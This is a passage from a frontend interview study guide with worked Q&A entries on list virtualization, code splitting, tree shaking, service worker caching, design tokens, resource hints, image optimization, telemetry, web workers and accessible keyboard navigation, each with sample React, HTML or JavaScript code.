import { useRef } from 'react';
import { useVirtualizer } from '@tanstack/react-virtual';

export function VirtualList({ items }: { items: string[] }) {
    const parentRef = useRef<HTMLDivElement>(null);

    const virtualizer = useVirtualizer({
        count: items.length, // e.g. 100,000 items!
        getScrollElement: () => parentRef.current,
        estimateSize: () => 50, // estimated row height in px
        overscan: 5 // render 5 extra rows above/below to prevent blank flashes
    });

    return (
        <div ref={parentRef} style={{ height: '500px', overflowY: 'auto' }}>
            {/* Total height container maintains correct scrollbar position */}
            <div style={{ height: `${virtualizer.getTotalSize()}px`, position: 'relative' }}>
                {virtualizer.getVirtualItems().map(virtualRow => (
                    <div
                        key={virtualRow.index}
                        style={{
                            position: 'absolute',
                            top: 0,
                            left: 0,
                            width: '100%',
                            height: `${virtualRow.size}px`,
                            transform: `translateY(${virtualRow.start}px)`
                        }}>
                        {items[virtualRow.index]}
                    </div>
                ))}
            </div>
        </div>
    );
}
```

**Complexity analysis and mechanics:**
- **DOM Node Count:** Bounded to $O(V)$ where $V$ is visible rows (~20–30 nodes), completely independent of total dataset size (e.g. 500,000 items).
- **Memory usage:** Drops DOM tree memory from gigabytes to megabytes, sustaining 60fps scrolling.

**Algorithmic mechanics and edge cases:**
For items with dynamic, unpredictable heights (e.g. expandable cards), use a `ResizeObserver` inside the row item that reports measured heights back to the virtualizer (`virtualizer.measureElement`), dynamically recalculating offset positions on the fly.

## Why

Virtualization allows rendering datasets with hundreds of thousands of items with zero DOM performance degradation.

## Worked Case

Walkthrough scenario: A financial log viewer renders 50,000 server log events. Rendering all 50,000 rows creates 250,000 DOM nodes, freezing the browser for 8 seconds and consuming 1.2GB of RAM. Implementing @tanstack/react-virtual reduces active DOM elements to 25, reducing initial render time to 40ms and memory consumption to 35MB with fluid 60fps scrolling.

## Risk

Virtualization breaks browser native text search (Cmd+F / Ctrl+F) because off-screen text is not present in the DOM tree.

## Trade-off

Dramatically improves memory and scroll FPS at the cost of breaking native browser Ctrl+F find-in-page search.

## Try This

Render 20,000 unvirtualized div rows in a list and observe memory usage and scrolling frame rate collapse.

## Follow-ups

### What is the purpose of the overscan parameter in list virtualizers?

Overscan renders a small number of buffer items just outside the visible viewport, preventing users from seeing blank flashes during fast flick scrolling.

## Citations

- https://tanstack.com/virtual/latest
- https://github.com/bvaughn/react-window

# How do code splitting, dynamic imports, and route-based chunking reduce initial JavaScript bundle size?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** In traditional single-page applications, all JavaScript across all routes and features is bundled into a single monolithic `main.js` file (often 2–5MB). Users on the login page are forced to download code for the admin dashboard, charting libraries, and checkout flows before seeing the page. **Code Splitting** breaks this monolith into smaller, on-demand chunks using ECMAScript dynamic `import('./Module')` syntax, which instructs bundlers (Webpack, Vite, Rollup) to emit separate chunk files downloaded only when the user navigates to that specific route or triggers that feature.

```tsx
import React, { Suspense, lazy } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

// 1. Route-based chunk splitting via React.lazy and dynamic import:
const HomePage = lazy(() => import('./routes/HomePage'));
const AdminDashboard = lazy(() => import('./routes/AdminDashboard')); // 500KB chunk only loaded by admins!
const SettingsPage = lazy(() => import('./routes/SettingsPage'));

export function AppRoutes() {
    return (
        <BrowserRouter>
            <Suspense fallback={<div className="route-spinner">Loading page...</div>}>
                <Routes>
                    <Route path="/" element={<HomePage />} />
                    <Route path="/admin" element={<AdminDashboard />} />
                    <Route path="/settings" element={<SettingsPage />} />
                </Routes>
            </Suspense>
        </BrowserRouter>
    );
}

// 2. Feature-level code splitting on user interaction:
function ExportButton({ data }: { data: any }) {
    const handleExport = async () => {
        // Download 200KB xlsx library only when user clicks export!
        const { utils, writeFile } = await import('xlsx');
        const ws = utils.json_to_sheet(data);
        const wb = utils.book_new();
        utils.book_append_sheet(wb, ws, 'Data');
        writeFile(wb, 'export.xlsx');
    };
    return <button onClick={handleExport}>Export to Excel</button>;
}
```

**Complexity analysis and mechanics:**
- **Initial load reduction:** Slashes initial JavaScript payload by 60–80%, directly improving Time to Interactive (TTI) and First Contentful Paint (FCP).
- **Network prefetching:** Modern routers prefetch lazy chunks on link hover (`<Link onMouseEnter={preloadRoute}>`), eliminating navigation delay.

**Algorithmic mechanics and edge cases:**
When deploying new versions to production with hashed filenames (`admin.8f3a.js` replaced by `admin.9b2c.js`), users on an open tab attempting to navigate to `/admin` can experience chunk load failures (HTTP 404). Handle chunk loading errors with an Error Boundary that executes `window.location.reload()` to fetch the updated asset manifest.

## Why

Route-based code splitting ensures users only download the exact JavaScript needed for the screen they are viewing.

## Worked Case

Walkthrough scenario: A SaaS app's initial bundle is 3.8MB due to an integrated PDF generator and admin analytics panel. Splitting admin routes into separate chunks and lazy-loading the PDF generator with import('jspdf') on button click drops the initial landing page bundle to 180KB, reducing mobile load time from 6.2s to 0.9s.

## Risk

Deploying new builds can invalidate old hashed chunk URLs, causing lazy route navigations to fail with chunk load errors.

## Trade-off

Introduces minor latency during route transitions unless paired with intelligent link prefetching.

## Try This

Run Vite build or Webpack analyzer and observe how dynamic import() splits single output bundles into multiple numbered chunks.

## Follow-ups

### How do you prefetch a lazy-loaded route chunk before the user clicks the navigation link?

Trigger the dynamic import function inside an onMouseEnter or onFocus event on the link: const Component = lazy(...); <Link onMouseEnter={() => import('./route')} />.

## Citations

- https://react.dev/reference/react/lazy
- https://web.dev/articles/reduce-javascript-payloads-with-code-splitting

# How does JavaScript tree shaking work under ES modules, and why do package sideEffects flags matter?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** **Tree Shaking** is a dead-code elimination optimization performed by modern bundlers (Webpack, Rollup, esbuild) that removes unused exports from the final production bundle. Tree shaking relies on the static structure of **ES Modules (ESM)** (`import` and `export` statements must appear at the top level and cannot be dynamic), enabling the compiler to construct a complete dependency graph and eliminate unused functions.

The **`"sideEffects"`** property in a package's `package.json` is the single most critical flag for effective tree shaking. By default, bundlers must assume that imported files might execute global side effects (modifying prototypes, setting global variables, injecting polyfills) when evaluated. Setting `"sideEffects": false` informs the bundler that no files in the package contain side effects, allowing the bundler to safely drop entirely unused imported modules.

```json
// package.json for an enterprise utility library:
{
  "name": "my-enterprise-utils",
  "version": "1.0.0",
  "sideEffects": [
    "*.css",
    "./src/polyfills.js"
  ]
}
```

```typescript
// In application code:
import { formatDate } from 'my-enterprise-utils';
// If sideEffects: false, the other 50 functions in my-enterprise-utils are completely omitted from bundle!
```

**Complexity analysis and mechanics:**
- **CommonJS vs ESM:** CommonJS (`require()`, `module.exports`) cannot be reliably tree-shaken because `require()` is dynamic and can be called inside `if` statements.
- **Pure annotations:** `/*#__PURE__*/` comments tell the minifier that a top-level function invocation (e.g. `const StyledDiv = /*#__PURE__*/ styled('div')`) has no side effects and can be dropped if unused.

**Algorithmic mechanics and edge cases:**
Importing barrel files (`import { x } from './components'`) where `components/index.ts` exports 500 components frequently defeats tree shaking unless `sideEffects: false` is configured, because the bundler evaluates all 500 module exports.

## Why

Tree shaking eliminates dead, unused library code, shrinking production bundles by hundreds of kilobytes.

## Worked Case

Walkthrough scenario: A developer imports import { debounce } from 'lodash'. The legacy lodash package uses CommonJS and lacks sideEffects flags, forcing Webpack to bundle all 300KB of lodash into the bundle. Switching to import { debounce } from 'lodash-es' with sideEffects: false allows Rollup to tree-shake away 295KB, bundling only the 5KB debounce function and its immediate dependencies.

## Risk

Omitting sideEffects: false causes bundlers to bundle entire libraries even if you only use a single utility function.

## Trade-off

Accidentally marking a package with sideEffects: false can strip necessary CSS imports or global polyfills from the build.

## Try This

Import a single function from lodash-es vs legacy lodash in a Vite project and compare resulting bundle sizes in build output.

## Follow-ups

### Why must CSS files be exempted in the sideEffects array (e.g. sideEffects: ['*.css'])?

CSS imports (import './styles.css') have no exported JavaScript identifiers; if sideEffects: false is unexempted, the bundler considers the CSS file unused and drops it entirely.

## Citations

- https://webpack.js.org/guides/tree-shaking/
- https://web.dev/articles/reduce-javascript-payloads-with-tree-shaking

# How do you implement a progressive web app (PWA) with Service Worker caching strategies (Cache-First vs Network-First)?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** A Progressive Web App (PWA) uses a **Service Worker**—a programmable network proxy running in a background thread independent of the web page—to intercept outgoing HTTP requests and manage local storage via the `CacheStorage` API. Production PWAs combine two primary caching strategies based on asset mutability:
1. **Cache-First (Fastest, for Static Assets):** Checks `CacheStorage` first. If present, returns cached asset in 0ms. If not, fetches from network, populates cache, and returns. Used for content-hashed assets (images, fonts, hashed JS/CSS bundles).
2. **Network-First (Freshest, for Dynamic HTML/API):** Attempts network fetch first. If successful, updates the cache. If offline or network fails, falls back to the latest cached copy. Used for HTML documents and API endpoints.

```javascript
// service-worker.js
const CACHE_NAME = 'app-v1';
const STATIC_ASSETS = ['/', '/index.html', '/style.css', '/app.js'];

// 1. Install Event: Pre-cache core app shell
self.addEventListener('install', (event) => {
    event.waitUntil(
        caches.open(CACHE_NAME).then(cache => cache.addAll(STATIC_ASSETS))
    );
    self.skipWaiting(); // Activate immediately
});

// 2. Fetch Event: Intercept network traffic
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);

    // Cache-First for static assets:
    if (url.pathname.match(/\.(js|css|png|jpg|svg|woff2)$/)) {
        event.respondWith(
            caches.match(event.request).then(cached => cached || fetch(event.request))
        );
        return;
    }

    // Network-First for HTML and API routes:
    event.respondWith(
        fetch(event.request)
            .then(networkRes => {
                const resClone = networkRes.clone();
                caches.open(CACHE_NAME).then(cache => cache.put(event.request, resClone));
                return networkRes;
            })
            .catch(() => caches.match(event.request)) // Offline fallback!
    );
});
```

**Complexity analysis and mechanics:**
- **Lifecycle stages:** `install` -> `activate` (cleans up old cache buckets) -> `fetch`.
- **Cloning required:** A `Response` body can only be read once; `networkRes.clone()` is mandatory before saving to cache.

**Algorithmic mechanics and edge cases:**
Never cache Service Worker files (`service-worker.js`) in HTTP caches (`Cache-Control: no-cache, no-store`). If the service worker file is cached by the browser, you will be unable to deploy updates to users.

## Why

Service Workers grant complete control over network offline caching, making web apps load instantaneously even on flaky networks.

## Worked Case

Walkthrough scenario: A field sales rep enters an underground parking garage with zero cell reception. The rep opens the PWA. The Service Worker intercepts the navigation request, detects network failure, and returns the pre-cached app shell and latest cached customer catalog from CacheStorage. The rep completes orders offline, which queue in IndexedDB for syncing upon exit.

## Risk

Serving index.html Cache-First can permanently lock users into an outdated app shell that never updates.

## Trade-off

Delivers full offline capability at the cost of managing background worker update lifecycles and cache invalidations.

## Try This

Register a Service Worker, go offline in Chrome DevTools Network panel, reload the page, and verify it renders from CacheStorage.

## Follow-ups

### What happens if you do not call networkRes.clone() before passing it to cache.put()?

The browser throws a TypeError: Response body already consumed when returning the response to the web page, breaking the render.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API
- https://web.dev/explore/progressive-web-apps

# How do you design a scalable Design System with design tokens, headless component primitives, and theme switching?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** A scalable enterprise Design System decouples visual design decisions from technical component behavior. It consists of three architectural tiers:
1. **Design Tokens:** The single source of truth for raw visual values (colors, spacing, typography, elevation, border-radii) exported from design tools (Figma) as JSON and compiled into **CSS Custom Properties** (variables). Theming is implemented by swapping CSS variable values at the `:root` or `[data-theme]` level.
2. **Headless Component Primitives:** Unstyled, fully accessible behavioral components (e.g. Radix UI, React Aria, Headless UI) that manage complex ARIA attributes, keyboard navigation (roving tabindex, arrow keys), focus traps, and modal lifecycles with zero CSS styling.
3. **Styled Domain Components:** The union of headless behavior and design token styling (e.g. `<Button>`, `<Select>`, `<Dialog>`), styled via Tailwind CSS, CSS Modules, or vanilla CSS variables.

```css
/* 1. Design Tokens as CSS Variables */
:root {
    --color-bg-primary: #ffffff;
    --color-text-primary: #111827;
    --color-accent: #2563eb;
}
[data-theme="dark"] {
    --color-bg-primary: #0f172a;
    --color-text-primary: #f8fafc;
    --color-accent: #38bdf8;
}
```

```tsx
// 2. Combining Headless Radix Dialog with Design Tokens:
import * as Dialog from '@radix-ui/react-dialog';

export function AccessibleModal({ title, children }: { title: string; children: React.ReactNode }) {
    return (
        <Dialog.Root>
            <Dialog.Trigger className="btn-primary">Open Dialog</Dialog.Trigger>
            <Dialog.Portal>
                <Dialog.Overlay className="modal-overlay" />
                <Dialog.Content className="modal-content">
                    <Dialog.Title>{title}</Dialog.Title>
                    {children}
                    <Dialog.Close className="btn-close">Close</Dialog.Close>
                </Dialog.Content>
            </Dialog.Portal>
        </Dialog.Root>
    );
}
```

**Complexity analysis and mechanics:**
- **Theme switching performance:** Toggling `document.documentElement.setAttribute('data-theme', 'dark')` recalculates styles in 0ms without re-rendering React component trees.
- **Accessibility (a11y):** Headless primitives guarantee WCAG 2.1 AA compliance out of the box without manual keyboard event handling.

**Algorithmic mechanics and edge cases:**
Prevent dark mode flashing on initial page load by embedding a tiny synchronous inline `<script>` in the document `<head>` that reads `localStorage.getItem('theme')` and sets `data-theme` on `<html>` *before* CSS renders.

## Why

Headless primitives guarantee bulletproof accessibility while design tokens enable instantaneous runtime theme switching.

## Worked Case

Walkthrough scenario: An enterprise company rebrands 8 separate web products. Previously, rebranding required updating 400 CSS files across 8 codebases, taking 4 months. Because products share a Design Token pipeline, designers updated colors in Figma. Tokens compiled to updated JSON, CI regenerated the CSS Custom Properties, and all 8 products rebranded in a single afternoon.

## Risk

Writing custom modal keyboard focus traps from scratch usually misses edge cases, trapping screen reader users in infinite focus loops.

## Trade-off

Adopting headless libraries adds an external dependency compared to writing raw unstyled HTML elements.

## Try This

Toggle data-theme='dark' on document.documentElement and observe all CSS variable colors transition instantly.

## Follow-ups

### How do you prevent theme flashing (FOUC) when loading dark mode in SSR applications?

Execute an inline blocking script in the HTML <head> that reads localStorage or prefers-color-scheme and applies the dark attribute before the body paints.

## Citations

- https://www.radix-ui.com/primitives
- https://m3.material.io/foundations/design-tokens/overview

# How do browser resource hints (preload, prefetch, preconnect, dns-prefetch) optimize critical rendering paths?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Browser Resource Hints provide declarative directives informing the browser's preload scanner about external resources and network connections before they are encountered in the document body:
1. **`dns-prefetch`:** Resolves DNS lookup for a cross-origin domain in the background (`<link rel="dns-prefetch" href="https://api.com">`), saving 50–100ms.
2. **`preconnect`:** Performs DNS resolution, TCP handshake, and TLS negotiation ahead of time (`<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>`), saving 100–300ms on initial API or font connections.
3. **`preload`:** Instructs the browser to download a high-priority critical resource needed for the **current page** immediately (`<link rel="preload" as="font" href="/font.woff2" crossorigin>`).
4. **`prefetch`:** Downloads a low-priority resource needed for **future navigations** in the background during browser idle time (`<link rel="prefetch" href="/dashboard-chunk.js">`).

```html
<!-- 1. Warm up TLS connection to external API domain -->
<link rel="preconnect" href="https://api.enterprise.com">

<!-- 2. Preload critical web font (MANDATORY: crossorigin for fonts!) -->
<link rel="preload" href="/fonts/inter.woff2" as="font" type="font/woff2" crossorigin>

<!-- 3. Preload LCP hero image with high fetch priority -->
<link rel="preload" href="/hero.avif" as="image" type="image/avif" fetchpriority="high">

<!-- 4. Prefetch next likely page chunk during idle time -->
<link rel="prefetch" href="/settings-page.js">
```

**Complexity analysis and mechanics:**
- **`crossorigin` attribute on fonts:** Fonts must be fetched anonymously according to web standards. Omitting `crossorigin` on a font `<link rel="preload">` causes the browser to download the font **twice** (once without credentials, and again with credentials)!
- **Unused preload warning:** If a preloaded resource is not used within 3 seconds of load, Chrome logs a console warning: *The resource was preloaded using link preload but not used within a few seconds*.

**Algorithmic mechanics and edge cases:**
Do not preload everything. Overusing `preload` saturates network bandwidth and starves critical CSS and JavaScript bundles, ironically worsening First Contentful Paint. Reserve `preload` strictly for 1 font, 1 LCP image, or critical route bundles.

## Why

Resource hints eliminate connection handshakes and pre-warm assets before the browser discovery parser finds them in CSS or JS.

## Worked Case

Walkthrough scenario: An application uses Google Fonts. By default, the browser downloads the CSS, parses it, finds the font URL, resolves DNS, completes TLS handshake, and downloads the font (400ms delay causing FOUT). Adding <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> negotiates the TLS connection in parallel with initial HTML streaming, reducing font load latency from 400ms to 80ms.

## Risk

Omitting crossorigin on font preloads causes the browser to download the exact same font file twice.

## Trade-off

Preloading consumes upfront bandwidth; prefetching future pages consumes mobile data for pages the user may never visit.

## Try This

Preload a font without crossorigin and inspect DevTools Network tab to observe the duplicate download.

## Follow-ups

### Why does Chrome emit a warning if a preloaded resource is not used within 3 seconds?

Preload is intended exclusively for immediate current-page critical assets; unused preloads indicate wasted bandwidth that delayed other critical resources.

## Citations

- https://web.dev/articles/preconnect-and-dns-prefetch
- https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/preload

# How do modern image optimization techniques (srcset, sizes, AVIF, WebP, aspect-ratio, lazy loading) minimize load times?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Images account for over 50% of total web page weight. Modern frontend engineering applies a five-part optimization strategy to deliver crisp visual assets with minimal byte transfer:
1. **Modern Formats (AVIF & WebP):** AVIF offers ~50% better compression than JPEG; WebP offers ~30%. Use the HTML `<picture>` element to serve AVIF with WebP and JPEG fallbacks.
2. **Responsive Resolutions (`srcset` and `sizes`):** Serve smaller image files to mobile screens and larger files to 4K desktops based on viewport width.
3. **Native Lazy Loading (`loading="lazy"`):** Defers image downloading until the element is within a threshold distance of the viewport.
4. **Layout Reservation (`aspect-ratio`):** Prevents Cumulative Layout Shift by enforcing container proportions.
5. **Asynchronous Decoding (`decoding="async"`):** Moves image byte decompression off the browser's main thread to prevent scrolling hitch.

```html
<picture>
    <!-- Next-gen format: AVIF (Smallest bytes) -->
    <source type="image/avif" srcset="/hero-400.avif 400w, /hero-800.avif 800w, /hero-1200.avif 1200w">
    <!-- Modern fallback: WebP -->
    <source type="image/webp" srcset="/hero-400.webp 400w, /hero-800.webp 800w, /hero-1200.webp 1200w">
    <!-- Fallback image tag with responsive sizes and layout reservation -->
    <img
        src="/hero-800.jpg"
        srcset="/hero-400.jpg 400w, /hero-800.jpg 800w, /hero-1200.jpg 1200w"
        sizes="(max-width: 768px) 100vw, 800px"
        width="800"
        height="450"
        style="width: 100%; height: auto; aspect-ratio: 16 / 9;"
        loading="lazy"
        decoding="async"
        alt="Product Overview">
</picture>
```

**Complexity analysis and mechanics:**
- **`sizes` attribute:** Tells the browser's preload scanner how wide the image will render *before CSS styles are parsed*, allowing it to pick the optimal `srcset` candidate immediately.
- **Bandwidth reduction:** Combining AVIF + responsive widths reduces mobile image downloads from 2MB to ~70KB.

**Algorithmic mechanics and edge cases:**
Never apply `loading="lazy"` to above-the-fold hero images or LCP elements. Lazy loading delays image discovery until layout completes, severely damaging Largest Contentful Paint.

## Why

AVIF compression and responsive srcset cut page transfer weight by up to 80% without sacrificing visual sharpness.

## Worked Case

Walkthrough scenario: An e-commerce product catalog page loads 24 product cards. Originally, it downloaded 24 uncompressed 1MB JPEGs (24MB total). Implementing AVIF compression, responsive srcset (300px on mobile), and loading="lazy" on cards below the fold reduced total page transfer to 480KB. Page load time dropped from 8.5s to 1.1s on cellular networks.

## Risk

Omitting sizes when using srcset causes browsers to assume 100vw width, downloading oversized desktop images on mobile screens.

## Trade-off

Generating multiple image formats and resolutions requires an automated image CDN or build-time asset processing pipeline.

## Try This

Inspect Network tab on mobile emulation vs desktop for a picture element and observe different srcset candidate selection.

## Follow-ups

### What does decoding='async' do on an HTML image tag?

It instructs the browser to decompress and decode image raster bytes on a background thread, preventing frame drops and main-thread scrolling jank.

## Citations

- https://web.dev/articles/serve-images-webp
- https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Responsive_images

# How do you design client-side error telemetry, performance monitoring (RUM), and distributed trace propagation?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Real User Monitoring (RUM) and client observability capture real-world user performance and production errors without degrading the application's runtime. A production telemetry architecture consists of three pillars:
1. **Error Telemetry:** Centralized capture via `window.onerror`, `window.onunhandledrejection`, and React Error Boundaries, sanitizing PII before batching.
2. **Performance Instrumentation:** Measuring Core Web Vitals via `web-vitals` library and `PerformanceObserver` API (reporting LCP, INP, CLS, TTFB).
3. **Distributed Trace Propagation:** Injecting W3C Trace Context headers (`traceparent`, `tracestate`) into outgoing `fetch` calls so backend microservices can trace a database query back to the initiating frontend click.

```typescript
// 1. W3C Distributed Trace Injection in API Client:
export function createTraceparent(): string {
    const version = '00';
    const traceId = crypto.randomUUID().replace(/-/g, '');
    const spanId = crypto.randomUUID().replace(/-/g, '').slice(0, 16);
    const flags = '01'; // Sampled
    return `${version}-${traceId}-${spanId}-${flags}`;
}

export async function telemetryFetch(url: string, init?: RequestInit) {
    const traceparent = createTraceparent();
    return fetch(url, {
        ...init,
        headers: { ...init?.headers, 'traceparent': traceparent }
    });
}

// 2. Reliable Beaconing on Page Unload:
export function sendTelemetry(endpoint: string, payload: any) {
    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
    // navigator.sendBeacon guarantees transmission even if tab is closing!
    if (navigator.sendBeacon) {
        navigator.sendBeacon(endpoint, blob);
    } else {
        fetch(endpoint, { method: 'POST', body: blob, keepalive: true });
    }
}
```

**Complexity analysis and mechanics:**
- **`navigator.sendBeacon`:** Standard fetch requests are cancelled when a tab closes. `sendBeacon()` queues data in the browser process itself, guaranteeing transmission with zero unmount delay.
- **PII sanitization:** Error stack traces and URLs must strip auth tokens, query parameters (`?token=...`), and credit card numbers before transmission.

**Algorithmic mechanics and edge cases:**
Sample telemetry at high traffic volumes (e.g. log 100% of errors, but sample only 5% of successful performance events) to prevent overwhelming telemetry ingest collectors.

## Why

Distributed tracing and beaconing connect frontend user actions directly to backend microservice logs without dropping unload events.

## Worked Case

Walkthrough scenario: A customer reports an order failed. The support engineer searches the customer's trace ID. The traceparent header links the frontend button click directly to the backend API gateway, payment service, and database lock timeout, pinpointing the exact failure within 60 seconds without reproducing on local machines.

## Risk

Sending telemetry using standard synchronous XHR during page unload freezes the browser and delays tab closing.

## Trade-off

sendBeacon payloads are restricted in size (typically 64KB max) and cannot receive server responses.

## Try This

Send an event with navigator.sendBeacon in a beforeunload listener, close the tab, and verify the network request reached the server.

## Follow-ups

### Why is keepalive: true used in fetch when sendBeacon is unsupported?

keepalive: true allows a fetch request to outlive the document that initiated it, ensuring data is sent even if the tab closes.

## Citations

- https://www.w3.org/TR/trace-context/
- https://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon

# How do web workers offload heavy computational tasks (e.g., encryption, large data parsing) from the main thread?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** JavaScript in web browsers executes in a single-threaded event loop shared by DOM manipulation, style layout, user input events, and script execution. Running a heavy computational task (e.g. parsing 50MB of CSV data, image manipulation, crypto hashing, or sorting 100,000 objects) on the main thread freezes the entire browser tab, dropping animation frames and causing severe INP penalties. **Web Workers** run scripts in a completely separate OS background thread, communicating with the main thread via message passing without touching or blocking the DOM.

```typescript
// 1. parser.worker.ts (Background Thread - Zero DOM Access)
self.onmessage = (event: MessageEvent<{ rawCSV: string }>) => {
    const rows = event.data.rawCSV.split('\n').map(line => line.split(','));
    // Perform heavy data transformations, regex parsing, sorting...
    const parsedData = rows.map(r => ({ id: r[0], val: parseFloat(r[1]) }));
    self.postMessage({ result: parsedData });
};

// 2. main.ts (Main UI Thread)
const worker = new Worker(new URL('./parser.worker.ts', import.meta.url), { type: 'module' });

export function parseLargeDataset(rawCSV: string): Promise<any[]> {
    return new Promise((resolve) => {
        worker.onmessage = (event) => resolve(event.data.result);
        worker.postMessage({ rawCSV }); // Dispatched to worker thread!
    });
}
```

**Complexity analysis and mechanics:**
- **Thread isolation:** Web Workers have no access to `window`, `document`, or DOM nodes; they have their own `self`, `fetch`, `IndexedDB`, and `crypto`.
- **Transferable Objects:** Large binary data (`ArrayBuffer`, `ImageBitmap`) can be transferred rather than copied using `postMessage(buffer, [buffer])`, achieving zero-copy 0ms transfer time.

**Algorithmic mechanics and edge cases:**
Copying massive JSON objects across `postMessage` incurs structured clone serialization serialization cost. For multi-megabyte payloads, convert data into typed arrays (`Uint8Array`) and pass them as **Transferable Objects** to avoid cloning latency.

## Why

Web Workers keep the main thread completely free of computational strain, sustaining smooth 60fps animations.

## Worked Case

Walkthrough scenario: A web spreadsheet application recalculates 50,000 financial formulas on every cell edit. Executing calculations on the main thread freezes typing for 600ms on every keystroke. Moving formula calculation to a Web Worker allows the user to continue typing smoothly at 60fps while formula results stream back asynchronously in the background.

## Risk

Structured cloning of massive objects across postMessage can itself take tens of milliseconds; use Transferable Objects for large binaries.

## Trade-off

Web Workers cannot touch the DOM directly and communicate strictly through asynchronous message passing.

## Try This

Run a 2-second while(true) loop on the main thread (page freezes) vs inside a Web Worker (page stays 100% responsive).

## Follow-ups

### What happens to an ArrayBuffer when passed as a Transferable Object in postMessage(buf, [buf])?

Its ownership is transferred to the worker; the buffer in the sending thread is neutered (byteLength becomes 0) with zero memory copy.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers
- https://developer.mozilla.org/en-US/docs/Web/API/Transferable

# How do you architect an accessible, keyboard-navigable component library conforming to WAI-ARIA authoring practices?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Building an accessible component library conforming to WCAG 2.1 AA and WAI-ARIA authoring practices requires treating keyboard navigation and assistive technology (screen readers) as primary architectural constraints. Core patterns include:
1. **Roving Tabindex vs aria-activedescendant:** Managing keyboard focus in composite widgets (menus, toolbars, grids). Using roving tabindex, the currently selected item has `tabIndex={0}` while all other items have `tabIndex={-1}`. Arrow keys move focus and update tabindex.
2. **Accessible Names:** Ensuring every interactive control has a computed accessible name via `<label>`, `aria-label`, or `aria-labelledby`.
3. **Focus Trapping:** In modal dialogs, trapping focus so pressing Tab on the last element cycles to the first, and pressing Escape dismisses the modal and returns focus to the trigger element.
4. **ARIA Roles & States:** Explicitly declaring states (`aria-expanded`, `aria-selected`, `aria-disabled`, `aria-checked`, `role="tablist"`).

```tsx
// Roving Tabindex Accessible Tab List:
function TabList({ tabs, selectedIndex, onSelect }: {
    tabs: string[];
    selectedIndex: number;
    onSelect: (index: number) => void;
}) {
    const handleKeyDown = (e: React.KeyboardEvent, index: number) => {
        let next = index;
        if (e.key === 'ArrowRight') next = (index + 1) % tabs.length;
        if (e.key === 'ArrowLeft')  next = (index - 1 + tabs.length) % tabs.length;
        if (next !== index) {
            e.preventDefault();
            onSelect(next);
            // Programmatically focus the new tab element
        }
    };

    return (
        <div role="tablist" aria-label="Account Sections">
            {tabs.map((tab, i) => (
                <button
                    key={tab}
                    role="tab"
                    aria-selected={i === selectedIndex}
                    tabIndex={i === selectedIndex ? 0 : -1} // Roving tabindex!
                    onClick={() => onSelect(i)}
                    onKeyDown={(e) => handleKeyDown(e, i)}>
                    {tab}
                </button>
            ))}
        </div>
    );
}
```

**Complexity analysis and mechanics:**
- **Single Tab Stop:** Entire composite widgets (like a 10-tab list or 50-row menu) represent exactly **one single Tab stop** in the overall document flow.
- **Focus Restoration:** Storing `document.activeElement` before opening a dialog and calling `.focus()` on it when the dialog unmounts.

**Algorithmic mechanics and edge cases:**
Never use `role="button"` on a `<div>` if a native `<button>` can be used. Native buttons natively support Space and Enter activation, disabled state semantics, and form submission without writing custom keyboard listeners.

## Why

Conforming to WAI-ARIA authoring practices guarantees usability for keyboard users and screen reader accessibility.

## Worked Case

Walkthrough scenario: A dropdown menu has 8 items. Originally, all 8 items had tabIndex=0. Tabbing through the page required pressing Tab 8 times just to get past the dropdown. Refactoring to a roving tabindex menu makes the entire menu a single Tab stop. Pressing Tab enters the menu, Arrow Down navigates items, and pressing Tab exits immediately to the next section.

## Risk

Failing to restore focus when closing modal dialogs disorients blind screen reader users back to the top of the document.

## Trade-off

Requires implementing keyboard event handlers (Arrow keys, Home, End, Escape) alongside standard click interactions.

## Try This

Navigate your application using only the Tab and Arrow keys with your mouse unplugged and verify all controls can be operated.

## Follow-ups

### What is the difference between aria-hidden='true' and the inert attribute?

aria-hidden hides elements from assistive screen readers but leaves them keyboard focusable; inert removes elements from both accessibility trees and keyboard focus.

## Citations

- https://www.w3.org/WAI/ARIA/apg/
- https://web.dev/explore/learn-accessibility

# How do HTML landmarks, headings and forms create an accessible document?

<!-- meta
answer_format: conceptual
domain: frontend
subdomain: frontend-foundations
difficulty: mechanism
review.status: draft
review.reviewer: Independent technical review pending
-->

## Answer

Semantic HTML gives browsers and assistive technology meaningful structure before scripts run. Use heading levels to reflect hierarchy, landmarks to identify major regions, labels to name controls and real form elements to provide expected interaction. A button activates an action; a link navigates to a resource. Custom attributes cannot repair every incorrect native element choice. Validate that important content and actions remain understandable when styling fails, keyboard input replaces a pointer, or JavaScript has not loaded.

## Why

